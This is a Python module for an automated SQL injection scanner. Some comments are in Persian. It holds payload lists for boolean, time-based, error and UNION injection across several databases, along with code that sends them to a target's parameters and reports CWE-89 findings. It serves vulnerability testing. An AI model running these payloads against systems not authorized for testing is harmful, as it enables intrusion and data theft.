"""
SQL Injection Scanner
"""
import asyncio
import re
import time
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity
from ..http.client import Response


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner"""
    
    # Boolean-based blind payloads - گسترده‌تر
    BOOLEAN_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' -- -",
        "' OR '1'='1' /*",
        "' OR '1'='1'#",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--",
        "') OR ('1'='1'-- -",
        "' OR 'a'='a",
        "' OR 'a'='a'--",
        "' OR 'a'='a'#",
        "' OR 1=1",
        "' OR 1=1 LIMIT 1--",
        "' OR 1=1 LIMIT 1#",
        "' OR 1=1 LIMIT 1/*",
        "' OR 'x'='x",
        "' OR 'x'='x'--",
        "' OR 'x'='x'#",
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "1' OR '1'='1'#",
        "1' OR 1=1",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        "'1'='1",
        "'1'='1'--",
        "'1'='1'#",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND 1=1",
        "1' AND 1=2",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND '1'='1",
        "' AND '1'='2",
    ]
    
    # Time-based blind payloads - گسترده‌تر
    TIME_PAYLOADS = [
        # MySQL
        "'; SELECT SLEEP(5)--",
        "'; SELECT SLEEP(10)--",
        "'; SELECT SLEEP(5)#",
        "'; SELECT SLEEP(10)#",
        "'; SELECT BENCHMARK(5000000,MD5(1))--",
        "'; SELECT BENCHMARK(5000000,MD5(1))#",
        "' UNION SELECT SLEEP(5)--",
        "' UNION SELECT SLEEP(10)--",
        "1' AND SLEEP(5)--",
        "1' AND SLEEP(10)--",
        "1' AND SLEEP(5)#",
        "1' AND SLEEP(10)#",
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "'; SELECT pg_sleep(10)--",
        "'; SELECT pg_sleep(5)#",
        "'; SELECT pg_sleep(10)#",
        "1' AND pg_sleep(5)--",
        "1' AND pg_sleep(10)--",
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:10'--",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; WAITFOR DELAY '00:00:10'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:10'--",
        # Oracle
        "'; DBMS_LOCK.SLEEP(5)--",
        "'; DBMS_LOCK.SLEEP(10)--",
        "1' AND DBMS_LOCK.SLEEP(5)--",
        # SQLite
        "'; SELECT sqlite3_sleep(5)--",
        "1' AND sqlite3_sleep(5)--",
    ]
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        "`",
        "``",
        ",",
        "\"",
        "\"\"",
        "/",
        "//",
        "\\",
        "\\\\",
        ";",
        "' or \"",
        "-- or #",
        "' OR '1",
        "' OR 1 -- -",
        "\" OR \"\" = \"",
        "\" OR 1 = 1 -- -",
        "' OR '' = '",
        "'='",
        "'LIKE'",
        "'=0--+",
        " OR 1=1",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2",
        "%00",
        "/*…*/ ",
        "+",
        "||",
        "%",
    ]
    
    # UNION-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
    ]
    
    # DBMS fingerprinting patterns
    DBMS_PATTERNS = {
        "MySQL": [
            r"mysql",
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"valid mysql result",
        ],
        "PostgreSQL": [
            r"postgresql",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"warning: pg_",
        ],
        "MSSQL": [
            r"microsoft sql server",
            r"odbc sql server",
            r"sqlserver",
            r"warning: mssql_",
        ],
        "Oracle": [
            r"ora-\d{5}",
            r"oracle error",
            r"oracle driver",
            r"oracle.*driver",
        ],
        "SQLite": [
            r"sqlite",
            r"sqlite3",
            r"sqlite error",
        ],
    }
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Get base response for comparison
        try:
            if method.upper() == "GET":
                base_resp = await self.http_client.get(url, params=params)
            else:
                base_resp = await self.http_client.post(url, data=params)
        except:
            base_resp = None
        
        # Test each parameter
        test_params = params or {}
        if not test_params:
            # Try to extract parameters from URL
            if "?" in url:
                query_string = url.split("?")[1]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        for param_name, param_value in test_params.items():
            # Test boolean-based
            vuln = await self._test_boolean_based(url, param_name, param_value, method, base_resp)
            if vuln:
                vulnerabilities.append(vuln)
                continue
            
            # Test time-based
            vuln = await self._test_time_based(url, param_name, param_value, method)
            if vuln:
                vulnerabilities.append(vuln)
                continue
            
            # Test error-based
            vuln = await self._test_error_based(url, param_name, param_value, method)
            if vuln:
                vulnerabilities.append(vuln)
                continue
            
            # Test UNION-based
            vuln = await self._test_union_based(url, param_name, param_value, method)
            if vuln:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_boolean_based(
        self, url: str, param: str, value: str, method: str, base_resp: Optional[Response]
    ) -> Optional[Vulnerability]:
        """Test for boolean-based blind SQLi with reduced false positives"""
        if not base_resp:
            return None
        
        base_length = len(base_resp.content)
        base_text = base_resp.text.lower()
        
        for payload in self.BOOLEAN_PAYLOADS[:15]:  # تست بیشتر payloadها
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params)
                else:
                    resp = await self.http_client.post(url, data=test_params)
                
                # Check for SQL error patterns - more strict
                if self._check_sql_errors(resp.text):
                    # Verify it's actually a SQL error, not just text matching
                    if self._verify_sql_error(resp.text):
                        return self._create_vulnerability(
                            name="SQL Injection (Error-based)",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="SQL error-based injection detected",
                            evidence="SQL error messages found in response",
                            recommendation="Use parameterized queries and input validation",
                            cwe="CWE-89"
                        )
                
                # More strict boolean-based detection
                resp_length = len(resp.content)
                length_diff = abs(resp_length - base_length)
                
                # Only consider if significant difference AND multiple indicators
                if length_diff > 200:  # Threshold پایین‌تر برای تشخیص بهتر
                    # Check for multiple indicators
                    indicators = 0
                    
                    # Check for SQL-specific keywords in response
                    sql_keywords = ["select", "from", "where", "union", "order by", "group by"]
                    for keyword in sql_keywords:
                        if keyword in resp.text.lower() and keyword not in base_text:
                            indicators += 1
                    
                    # Check for database-specific patterns
                    db_patterns = [
                        r"mysql_fetch",
                        r"pg_query",
                        r"mssql_",
                        r"ora-\d{5}",
                    ]
                    for pattern in db_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            indicators += 1
                    
                    # Require at least 2 indicators to reduce false positives
                    if indicators >= 2:
                        return self._create_vulnerability(
                            name="SQL Injection (Boolean-based Blind)",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="Boolean-based blind SQL injection detected",
                            evidence=f"Response changed significantly with {indicators} SQL indicators",
                            recommendation="Use parameterized queries and input validation",
                            cwe="CWE-89"
                        )
            except:
                continue
        
        return None
    
    def _verify_sql_error(self, text: str) -> bool:
        """Verify that the error is actually a SQL error, not false positive"""
        # More specific SQL error patterns
        specific_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"postgresql.*error",
            r"mssql.*error",
            r"ora-\d{5}",
            r"quoted string not properly terminated",
            r"unclosed quotation mark",
            r"you have an error in your sql syntax",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_array\(\)",
            r"pg_query\(\)",
        ]
        
        text_lower = text.lower()
        for pattern in specific_patterns:
            if re.search(pattern, text_lower, re.IGNORECASE):
                # Additional check: make sure it's not just in HTML comments or user content
                # Simple heuristic: if it appears in structured context, it's more likely real
                return True
        
        return False
    
    async def _test_time_based(self, url: str, param: str, value: str, method: str) -> Optional[Vulnerability]:
        """Test for time-based blind SQLi with baseline comparison"""
        # Get baseline response time
        try:
            baseline_params = {param: "1"}
            start = time.time()
            if method.upper() == "GET":
                await self.http_client.get(url, params=baseline_params, timeout=10)
            else:
                await self.http_client.post(url, data=baseline_params, timeout=10)
            baseline_time = time.time() - start
        except:
            baseline_time = 1.0
        
        for payload in self.TIME_PAYLOADS[:8]:  # تست بیشتر payloadها
            try:
                test_params = {param: payload}
                start_time = time.time()
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=15)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=15)
                
                elapsed = time.time() - start_time
                
                # More strict: delay must be significantly more than baseline
                delay_threshold = max(5.0, baseline_time * 3)
                
                if elapsed > delay_threshold:
                    # Verify it's consistent (test again)
                    start_time2 = time.time()
                    if method.upper() == "GET":
                        await self.http_client.get(url, params=test_params, timeout=15)
                    else:
                        await self.http_client.post(url, data=test_params, timeout=15)
                    elapsed2 = time.time() - start_time2
                    
                    # Both tests must show delay
                    if elapsed2 > delay_threshold:
                        return self._create_vulnerability(
                            name="SQL Injection (Time-based Blind)",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="Time-based blind SQL injection detected",
                            evidence=f"Consistent delay: {elapsed:.2f}s and {elapsed2:.2f}s (baseline: {baseline_time:.2f}s)",
                            recommendation="Use parameterized queries and input validation",
                            cwe="CWE-89"
                        )
            except asyncio.TimeoutError:
                # Only report if baseline didn't timeout
                if baseline_time < 10:
                    # Test once more to confirm
                    try:
                        test_params = {param: payload}
                        if method.upper() == "GET":
                            await self.http_client.get(url, params=test_params, timeout=15)
                        else:
                            await self.http_client.post(url, data=test_params, timeout=15)
                    except asyncio.TimeoutError:
                        # Confirmed timeout
                        return self._create_vulnerability(
                            name="SQL Injection (Time-based Blind)",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="Possible time-based blind SQL injection",
                            evidence="Consistent timeout with SQL delay payload",
                            recommendation="Use parameterized queries and input validation",
                            cwe="CWE-89"
                        )
            except:
                continue
        
        return None
    
    async def _test_error_based(self, url: str, param: str, value: str, method: str) -> Optional[Vulnerability]:
        """Test for error-based SQLi"""
        for payload in self.ERROR_PAYLOADS[:20]:  # تست بیشتر payloadها
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params)
                else:
                    resp = await self.http_client.post(url, data=test_params)
                
                # Check for SQL errors
                if self._check_sql_errors(resp.text):
                    dbms = self._fingerprint_dbms(resp.text)
                    return self._create_vulnerability(
                        name="SQL Injection (Error-based)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        description=f"Error-based SQL injection detected. DBMS: {dbms}",
                        evidence="SQL error messages found in response",
                        recommendation="Use parameterized queries and input validation. Disable error messages in production.",
                        cwe="CWE-89"
                    )
            except:
                continue
        
        return None
    
    async def _test_union_based(self, url: str, param: str, value: str, method: str) -> Optional[Vulnerability]:
        """Test for UNION-based SQLi"""
        for payload in self.UNION_PAYLOADS[:10]:  # تست بیشتر payloadها
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params)
                else:
                    resp = await self.http_client.post(url, data=test_params)
                
                # Check for SQL errors or UNION success indicators
                if self._check_sql_errors(resp.text):
                    return self._create_vulnerability(
                        name="SQL Injection (UNION-based)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        description="UNION-based SQL injection detected",
                        evidence="SQL error or UNION query response detected",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
            except:
                continue
        
        return None
    
    def _check_sql_errors(self, text: str) -> bool:
        """Check if response contains SQL error patterns"""
        error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*\Wmysql",
            r"valid mysql result",
            r"postgresql.*error",
            r"warning.*\Wpg_",
            r"valid pg result",
            r"mssql.*error",
            r"warning.*\Wmssql_",
            r"oracle.*error",
            r"ora-\d{5}",
            r"sqlite.*error",
            r"sqlite3.*error",
            r"sql.*error",
            r"sql.*exception",
            r"sql.*warning",
            r"quoted string not properly terminated",
            r"unclosed quotation mark",
            r"you have an error in your sql syntax",
        ]
        
        text_lower = text.lower()
        for pattern in error_patterns:
            if re.search(pattern, text_lower, re.IGNORECASE):
                return True
        return False
    
    def _fingerprint_dbms(self, text: str) -> str:
        """Fingerprint the database management system"""
        text_lower = text.lower()
        for dbms, patterns in self.DBMS_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return dbms
        return "Unknown"

